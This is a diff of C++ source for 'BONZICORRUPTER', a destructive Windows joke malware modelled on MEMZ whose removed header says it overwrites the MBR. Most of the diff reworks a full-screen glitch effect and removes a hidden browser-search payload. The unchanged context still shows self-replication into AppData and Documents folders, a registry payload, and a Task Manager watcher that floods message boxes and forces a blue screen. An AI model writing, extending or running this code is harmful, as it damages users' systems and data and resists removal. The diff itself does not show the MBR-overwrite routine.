@@ -1,7 +1,3 @@
-// BONZICORRUPTER - A destructive Windows malware inspired by MEMZ
-// THIS WILL OVERWRITE YOUR MBR WITH A BONZIBUDDY IMAGE
-// I'M NOT A SCRIPT KIDDIE, THIS IS JUST SOME SHIT I MADE WITH AI FOR FUN
-
 #include <windows.h>
 #include <thread>
 #include <chrono>
@@ -15,6 +11,8 @@
 #include <cstdlib>
 #include <random>
 #include <cmath>
+#include <stdint.h>
+#include <algorithm>
 
 // Define Pi if not available
 #ifndef M_PI
@@ -142,164 +140,401 @@ void changeColors() {
 
 // --- GLITCH EFFECT --- //
 
-void glitchEffect() {
+void glitchEffect()
+{
     HDC hdcScreen = GetDC(NULL);
-    if (!hdcScreen) return;
+    if (!hdcScreen)
+        return;
 
-    int sw = GetSystemMetrics(SM_CXSCREEN);
-    int sh = GetSystemMetrics(SM_CYSCREEN);
+    const int sw = GetSystemMetrics(SM_CXSCREEN);
+    const int sh = GetSystemMetrics(SM_CYSCREEN);
 
-    // Create an off-screen memory buffer for flicker-free 100% dense rendering
-    HDC hdcMem = CreateCompatibleDC(hdcScreen);
-    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, sw, sh);
-    HBITMAP hOldBmp = (HBITMAP)SelectObject(hdcMem, hBitmap);
+    const int W = 512;
+    const int H = 384;
 
-    // Fixed seed engine to guarantee the layout is 1:1 reproducible every execution
+    const COLORREF BLACK    = RGB(0,   0,   0);
+    const COLORREF BLUE     = RGB(27,  50,  252);
+    const COLORREF WHITE    = RGB(255, 255, 255);
+    const COLORREF RED      = RGB(255, 0,   0);
+    const COLORREF GREEN    = RGB(0,   255, 0);
+    const COLORREF CYAN     = RGB(0,   255, 255);
+    const COLORREF MAGENTA  = RGB(255, 0,   255);
+    const COLORREF YELLOW   = RGB(255, 255, 0);
+    const COLORREF DARKBLUE = RGB(0,   0,   180);
+
+    std::vector<DWORD> pixels(W * H, 0);
+
     std::mt19937 gen(777);
 
-    // --- Step 1: Base Background Fill (Black) ---
-    HBRUSH hBlack = CreateSolidBrush(RGB(0, 0, 0));
-    RECT screenRect = { 0, 0, sw, sh };
-    FillRect(hdcMem, &screenRect, hBlack);
-    DeleteObject(hBlack);
-
-    // Exact palette extracted from the reference screenshot
-    COLORREF palette[] = {
-        RGB(0, 255, 255),   // Cyan
-        RGB(255, 0, 255),   // Magenta
-        RGB(255, 255, 0),   // Yellow
-        RGB(0, 0, 255),     // Blue
-        RGB(0, 0, 180),     // Dark Blue
-        RGB(255, 0, 0),     // Red
-        RGB(0, 200, 0),     // Green
-        RGB(255, 255, 255), // Pure White
-        RGB(0, 0, 0),       // Black
-        RGB(140, 0, 140)    // Dark Purple
-    };
-
-    // --- Step 2: Dense Micro-Tile Mosaic Grid (Full Screen) ---
-    int cols = sw / 14 + 1;
-    int rows = sh / 10 + 1;
-
-    for (int r = 0; r < rows; ++r) {
-        for (int c = 0; c < cols; ++c) {
-            int x = c * 14 + (gen() % 5 - 2);
-            int y = r * 10 + (gen() % 3 - 1);
-            int w = 10 + (gen() % 18);
-            int h = 6 + (gen() % 12);
-
-            int colorIdx = gen() % 9;
-            // Lower screen heavy black/blue bias
-            if (y > sh * 0.25 && (gen() % 3 == 0)) {
-                colorIdx = (gen() % 2 == 0) ? 3 : 8;
-            }
-
-            HBRUSH hb = CreateSolidBrush(palette[colorIdx]);
-            RECT rTile = { x, y, x + w, y + h };
-            FillRect(hdcMem, &rTile, hb);
-            DeleteObject(hb);
-        }
-    }
-
-    // --- Step 3: Mid-Left Deep Blue Mass (X: 0%-36%, Y: 22%-65%) ---
-    int blueW = static_cast<int>(sw * 0.36);
-    int blueYStart = static_cast<int>(sh * 0.22);
-    int blueYEnd = static_cast<int>(sh * 0.65);
-
-    for (int y = blueYStart; y < blueYEnd; y += 8) {
-        for (int x = 0; x < blueW; x += 12) {
-            int w = 8 + (gen() % 20);
-            int h = 5 + (gen() % 12);
-            COLORREF blueCol = (gen() % 5 == 0) ? RGB(0, 255, 255) : 
-                              ((gen() % 4 == 0) ? RGB(255, 255, 255) : RGB(0, 0, 220));
-            HBRUSH hb = CreateSolidBrush(blueCol);
-            RECT rBlue = { x, y, x + w, y + h };
-            FillRect(hdcMem, &rBlue, hb);
-            DeleteObject(hb);
-        }
-    }
-
-    // --- Step 4: Top Horizontal Scanline Banding (Y: 0%-22%) ---
-    int topMaxY = static_cast<int>(sh * 0.22);
-    for (int y = 0; y < topMaxY; y += 2) {
-        int h = 1 + (gen() % 5);
-        COLORREF c = palette[gen() % 8];
-        // Distinct pink/cyan horizontal band stack near Y ~ 15%-18%
-        if (y > topMaxY * 0.65 && y < topMaxY * 0.85) {
-            c = (gen() % 3 == 0) ? RGB(0, 255, 255) : RGB(255, 0, 255);
-        }
-        HBRUSH hb = CreateSolidBrush(c);
-        RECT rLine = { 0, y, sw, y + h };
-        FillRect(hdcMem, &rLine, hb);
-        DeleteObject(hb);
-        y += h;
-    }
-
-    // --- Step 5: Bottom-Left Thin Line Cluster (X: 0%-25%, Y: 75%-95%) ---
-    int blYStart = static_cast<int>(sh * 0.75);
-    int blYEnd = static_cast<int>(sh * 0.95);
-    int blW = static_cast<int>(sw * 0.25);
-    for (int y = blYStart; y < blYEnd; y += 3) {
-        int h = 1 + (gen() % 3);
-        COLORREF c = (gen() % 2 == 0) ? RGB(255, 255, 255) : RGB(0, 0, 255);
-        HBRUSH hb = CreateSolidBrush(c);
-        RECT rBL = { 0, y, blW, y + h };
-        FillRect(hdcMem, &rBL, hb);
-        DeleteObject(hb);
-    }
-
-    // --- Step 6: Vertical Hairline Cuts & Inversions ---
-    int vertCutXs[] = { 
-        static_cast<int>(sw * 0.02), static_cast<int>(sw * 0.03), static_cast<int>(sw * 0.05),
-        static_cast<int>(sw * 0.18), static_cast<int>(sw * 0.22), static_cast<int>(sw * 0.35),
-        static_cast<int>(sw * 0.52), static_cast<int>(sw * 0.72), static_cast<int>(sw * 0.91)
-    };
-
-    for (int vx : vertCutXs) {
-        int w = 1 + (gen() % 3);
-        int vStart = gen() % (sh / 3);
-        int vLen = sh / 2 + (gen() % (sh / 2));
-        
-        // Invert slice
-        BitBlt(hdcMem, vx, vStart, w, vLen, hdcMem, vx, vStart, DSTINVERT);
-        
-        // Draw bright white vertical hairline
-        HBRUSH hWhite = CreateSolidBrush((gen() % 2 == 0) ? RGB(255, 255, 255) : RGB(0, 255, 255));
-        RECT rVert = { vx, vStart, vx + w, vStart + vLen };
-        FillRect(hdcMem, &rVert, hWhite);
-        DeleteObject(hWhite);
-    }
-
-    // --- Step 7: Raster Shifting (Jagged Edge Glitch Borders) ---
-    DWORD ropCodes[] = { SRCINVERT, SRCAND, SRCPAINT };
-    for (int i = 0; i < 180; ++i) {
-        int x = gen() % (sw - 40);
-        int y = gen() % (sh - 20);
-        int w = 8 + (gen() % 35);
-        int h = 5 + (gen() % 20);
-        int offX = (gen() % 30) - 15;
-        int offY = (gen() % 16) - 8;
-        
-        BitBlt(hdcMem, x, y, w, h, hdcMem, x + offX, y + offY, ropCodes[gen() % 3]);
-    }
-
-    // --- Step 8: Display Frame for Exactly 1 Second (1000ms) ---
-    auto startTime = std::chrono::steady_clock::now();
-    while (std::chrono::duration_cast<std::chrono::milliseconds>(
-            std::chrono::steady_clock::now() - startTime).count() < 1000)
+    auto rnd = [&](int a, int b) -> int
     {
-        BitBlt(hdcScreen, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
-        std::this_thread::sleep_for(std::chrono::milliseconds(10));
+        return a + static_cast<int>(gen() % (b - a + 1));
+    };
+
+    auto putPixel = [&](int x, int y, COLORREF c)
+    {
+        if (x >= 0 && x < W && y >= 0 && y < H)
+            pixels[y * W + x] = c;
+    };
+
+    auto fillRect = [&](int x, int y, int w, int h, COLORREF c)
+    {
+        int x2 = std::min(W, x + w);
+        int y2 = std::min(H, y + h);
+
+        for (int yy = std::max(0, y); yy < y2; ++yy)
+        {
+            DWORD* row = &pixels[yy * W];
+
+            for (int xx = std::max(0, x); xx < x2; ++xx)
+                row[xx] = c;
+        }
+    };
+
+    std::fill(pixels.begin(), pixels.end(), BLACK);
+
+    for (int i = 0; i < 35000; ++i)
+    {
+        int x = rnd(0, W - 1);
+        int y = rnd(0, H - 1);
+
+        int choice = rnd(0, 99);
+        COLORREF c;
+
+        if (choice < 53)
+            c = BLACK;
+        else if (choice < 66)
+            c = BLUE;
+        else if (choice < 73)
+            c = WHITE;
+        else if (choice < 78)
+            c = RED;
+        else if (choice < 83)
+            c = GREEN;
+        else if (choice < 88)
+            c = CYAN;
+        else if (choice < 93)
+            c = MAGENTA;
+        else if (choice < 96)
+            c = YELLOW;
+        else
+            c = DARKBLUE;
+
+        putPixel(x, y, c);
     }
 
-    // --- Step 9: Clean Up Memory & Restore Desktop ---
-    SelectObject(hdcMem, hOldBmp);
-    DeleteObject(hBitmap);
+    for (int i = 0; i < 4200; ++i)
+    {
+        int y = rnd(0, H - 1);
+
+        if (rnd(0, 100) < 65)
+            y = rnd(0, 250);
+
+        int x = rnd(0, W - 1);
+        int w = rnd(1, 55);
+        int h = rnd(1, 3);
+
+        int choice = rnd(0, 99);
+        COLORREF c;
+
+        if (choice < 38)
+            c = BLACK;
+        else if (choice < 53)
+            c = BLUE;
+        else if (choice < 63)
+            c = WHITE;
+        else if (choice < 71)
+            c = RED;
+        else if (choice < 79)
+            c = GREEN;
+        else if (choice < 87)
+            c = CYAN;
+        else if (choice < 94)
+            c = MAGENTA;
+        else
+            c = YELLOW;
+
+        fillRect(x, y, w, h, c);
+    }
+
+    for (int i = 0; i < 180; ++i)
+    {
+        int y = rnd(0, 80);
+        int x = rnd(0, W - 1);
+        int w = rnd(3, 100);
+
+        COLORREF c;
+
+        switch (rnd(0, 5))
+        {
+            case 0: c = CYAN; break;
+            case 1: c = MAGENTA; break;
+            case 2: c = WHITE; break;
+            case 3: c = RED; break;
+            case 4: c = BLUE; break;
+            default: c = GREEN; break;
+        }
+
+        fillRect(x, y, w, rnd(1, 3), c);
+    }
+
+    for (int i = 0; i < 2300; ++i)
+    {
+        int x = rnd(0, 230);
+        int y = rnd(80, 255);
+
+        int w = rnd(2, 30);
+        int h = rnd(2, 15);
+
+        COLORREF c;
+
+        int choice = rnd(0, 99);
+
+        if (choice < 48)
+            c = BLUE;
+        else if (choice < 65)
+            c = DARKBLUE;
+        else if (choice < 75)
+            c = CYAN;
+        else if (choice < 84)
+            c = WHITE;
+        else if (choice < 90)
+            c = BLACK;
+        else if (choice < 95)
+            c = RED;
+        else
+            c = MAGENTA;
+
+        fillRect(x, y, w, h, c);
+    }
+
+    int verticals[] =
+    {
+        7, 10, 15, 20, 27, 32,
+        43, 48, 56, 65,
+        174, 179, 184,
+        196, 201, 208,
+        276, 281,
+        355, 359,
+        445, 451
+    };
+
+    for (int i = 0; i < (int)(sizeof(verticals) / sizeof(verticals[0])); ++i)
+    {
+        int x = verticals[i];
+
+        int y = rnd(0, 100);
+        int height = rnd(60, 300);
+
+        COLORREF c;
+
+        switch (rnd(0, 6))
+        {
+            case 0: c = WHITE; break;
+            case 1: c = CYAN; break;
+            case 2: c = MAGENTA; break;
+            case 3: c = RED; break;
+            case 4: c = GREEN; break;
+            case 5: c = BLUE; break;
+            default: c = YELLOW; break;
+        }
+
+        fillRect(x, y, rnd(1, 3), height, c);
+    }
+
+    for (int i = 0; i < 700; ++i)
+    {
+        int y = rnd(270, 370);
+        int x = rnd(0, 140);
+        int w = rnd(5, 150);
+
+        COLORREF c;
+
+        int r = rnd(0, 99);
+
+        if (r < 40)
+            c = BLUE;
+        else if (r < 55)
+            c = WHITE;
+        else if (r < 65)
+            c = CYAN;
+        else if (r < 75)
+            c = MAGENTA;
+        else if (r < 85)
+            c = RED;
+        else if (r < 92)
+            c = GREEN;
+        else
+            c = BLACK;
+
+        fillRect(x, y, w, rnd(1, 2), c);
+    }
+
+    for (int i = 0; i < 3200; ++i)
+    {
+        int x = rnd(0, W - 1);
+        int y = rnd(0, H - 1);
+
+        int w = rnd(1, 12);
+        int h = rnd(1, 8);
+
+        COLORREF c;
+
+        switch (rnd(0, 9))
+        {
+            case 0:
+            case 1:
+            case 2:
+                c = BLACK;
+                break;
+
+            case 3:
+            case 4:
+                c = BLUE;
+                break;
+
+            case 5:
+                c = WHITE;
+                break;
+
+            case 6:
+                c = RED;
+                break;
+
+            case 7:
+                c = GREEN;
+                break;
+
+            case 8:
+                c = MAGENTA;
+                break;
+
+            default:
+                c = CYAN;
+                break;
+        }
+
+        fillRect(x, y, w, h, c);
+    }
+
+    for (int i = 0; i < 12000; ++i)
+    {
+        int x = rnd(0, W - 1);
+        int y = rnd(0, H - 1);
+
+        DWORD p = pixels[y * W + x];
+
+        BYTE r = GetRValue(p);
+        BYTE g = GetGValue(p);
+        BYTE b = GetBValue(p);
+
+        int mode = rnd(0, 5);
+
+        if (mode == 0)
+            r ^= (BYTE)rnd(0, 7);
+
+        if (mode == 1)
+            g ^= (BYTE)rnd(0, 7);
+
+        if (mode == 2)
+            b ^= (BYTE)rnd(0, 7);
+
+        if (mode == 3)
+        {
+            r = (BYTE)std::min(255, (int)r + rnd(0, 4));
+            b = (BYTE)std::min(255, (int)b + rnd(0, 4));
+        }
+
+        if (mode == 4)
+        {
+            b = (BYTE)std::min(255, (int)b + rnd(0, 8));
+        }
+
+        pixels[y * W + x] = RGB(r, g, b);
+    }
+
+    BITMAPINFO bmi;
+    ZeroMemory(&bmi, sizeof(bmi));
+
+    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+    bmi.bmiHeader.biWidth = W;
+    bmi.bmiHeader.biHeight = -H;
+    bmi.bmiHeader.biPlanes = 1;
+    bmi.bmiHeader.biBitCount = 32;
+    bmi.bmiHeader.biCompression = BI_RGB;
+
+    void* dibBits = NULL;
+
+    HBITMAP hDIB = CreateDIBSection(
+        hdcScreen,
+        &bmi,
+        DIB_RGB_COLORS,
+        &dibBits,
+        NULL,
+        0
+    );
+
+    if (!hDIB || !dibBits)
+    {
+        ReleaseDC(NULL, hdcScreen);
+        return;
+    }
+
+    memcpy(dibBits, pixels.data(), pixels.size() * sizeof(DWORD));
+
+    HDC hdcMem = CreateCompatibleDC(hdcScreen);
+
+    if (!hdcMem)
+    {
+        DeleteObject(hDIB);
+        ReleaseDC(NULL, hdcScreen);
+        return;
+    }
+
+    HBITMAP oldBmp = (HBITMAP)SelectObject(hdcMem, hDIB);
+
+    SetStretchBltMode(hdcScreen, COLORONCOLOR);
+
+    auto startTime = std::chrono::steady_clock::now();
+
+    while (std::chrono::duration_cast<std::chrono::milliseconds>(
+        std::chrono::steady_clock::now() - startTime).count() < 1000)
+    {
+        StretchBlt(
+            hdcScreen,
+            0,
+            0,
+            sw,
+            sh,
+            hdcMem,
+            0,
+            0,
+            W,
+            H,
+            SRCCOPY
+        );
+
+        std::this_thread::sleep_for(
+            std::chrono::milliseconds(10)
+        );
+    }
+
+    SelectObject(hdcMem, oldBmp);
+
+    DeleteObject(hDIB);
     DeleteDC(hdcMem);
+
     ReleaseDC(NULL, hdcScreen);
 
-    // Refresh Windows desktop back to normal
-    RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN | RDW_UPDATENOW);
+    RedrawWindow(
+        NULL,
+        NULL,
+        NULL,
+        RDW_INVALIDATE |
+        RDW_ERASE |
+        RDW_ALLCHILDREN |
+        RDW_UPDATENOW
+    );
 }
 
 // --- RANDOM BEEP GENERATOR --- //
@@ -540,22 +775,6 @@ void replicationPayload() {
         copyToFolder(CSIDL_APPDATA, "BONZI_");
         copyToFolder(CSIDL_PERSONAL, "BONZI_");
         std::this_thread::sleep_for(std::chrono::milliseconds(2000));
-    }
-}
-
-// --- SEARCH PAYLOAD --- //
-
-void searchPayload() {
-    std::vector<std::string> queries = {
-        "how to download bonzibuddy?",
-        "bonziworld", "pls help", "worst antivirus ever download",
-        "pc optimizer pro", "how to get dank memes", "roblox exploits"
-    };
-    for (const auto& q : queries) {
-        std::string url = "https://www.google.com/search?q=" + q;
-        // SW_HIDE hides the browser window itself
-        ShellExecuteA(NULL, "open", url.c_str(), NULL, NULL, SW_HIDE); 
-        std::this_thread::sleep_for(std::chrono::seconds(30)); 
     }
 }
 
@@ -940,8 +1159,8 @@ void taskManagerMonitor() {
         }
 
         if (taskMgrFound) {
-            for (int i = 0; i < 200; i++) {
-                std::thread(spawnChaosBox, "NICE TRY").detach();
+            for (int i = 0; i < 100; i++) {
+                std::thread(spawnChaosBox, "YOUR COMPUTER IS FUCKED").detach();
                 std::this_thread::sleep_for(std::chrono::milliseconds(30));
             }
             triggerBSOD();
@@ -957,7 +1176,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return 0;
     }
 
-    if (MessageBoxA(NULL, "LAST WARNING, I AM NOT RESPONSIBLE FOR ANY DAMAGES CAUSED BY THIS MALWARE! CLICK NO TO EXIT THIS PROGRAM OR YES TO CONTINUE!", "Warning", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) != IDYES) {
+    if (MessageBoxA(NULL, "LAST WARNING, I AM NOT RESPONSIBLE FOR ANY DAMAGES CAUSED BY THIS MALWARE! CLICK NO TO EXIT THIS PROGRAM OR CLICK YES TO CONTINUE!", "Warning", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) != IDYES) {
         return 0;
     }
 
@@ -979,9 +1198,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     std::thread(soundPayload).detach();
     std::thread(cursorShakingPayload).detach();
 
-    // 40 Seconds - Start search payload and cursor icon trail
+    // 40 Seconds - Start cursor icon trail
     std::this_thread::sleep_for(std::chrono::seconds(20));
-    std::thread(searchPayload).detach();
     std::thread(cursorTrail).detach();
 
     // 60 Seconds - Start registry payload & replication payload
